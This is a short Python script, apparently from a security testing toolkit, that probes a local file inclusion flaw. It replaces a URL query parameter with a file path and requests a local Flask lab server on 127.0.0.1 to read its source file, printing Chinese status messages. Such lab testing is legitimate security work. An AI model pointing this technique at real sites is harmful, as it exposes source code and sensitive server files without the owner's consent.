from core.requester import Requester
import urllib.parse

def read_file_by_path(url, param_name, file_path):
    req = Requester()
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    params[param_name] = [file_path]
    new_query = urllib.parse.urlencode(params, doseq=True)
    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
    status, text = req.get(test_url)
    return text

if __name__ == "__main__":
    content = read_file_by_path(
        "http://127.0.0.1:5005/view?page=home",
        "page",
        "file_inclusion_target.py"
    )
    if content and "from flask" in content:
        print("[+] 成功读取源码")
        print(content[:200])  # 打印前200字符
    else:
        print("[-] 读取失败")